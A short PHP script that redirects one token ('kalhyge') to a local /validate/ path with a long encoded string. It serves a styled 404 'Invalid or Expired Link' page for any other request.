<?php
$token = basename($_SERVER['REQUEST_URI']);

$tokens = [
  'kalhyge' => '/validate/XVE6MBCADQwqF6fpWdluXJ_FMrcpXXxPEvXVUNVNPMEVOU1cyTzRWVEFSSEFUMzU0V1JUUXVE6MBCADQwqF6fpWdluXJ_FMrcpXXxPEvXVUNVNPMEVOU1cyTzRWVEFSSEFUMzU0V1JUU'
];

if (isset($tokens[$token])) {
  header("Location: " . $tokens[$token], true, 302);
  exit;
}

// Invalid token → show friendly error page
http_response_code(404);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Invalid Link</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 60px;
      color: #333;
    }
    .container {
      max-width: 480px;
      margin: auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Invalid or Expired Link</h2>
    <p>This link is no longer valid. Please check the URL or contact support.</p>
  </div>
</body>
</html>
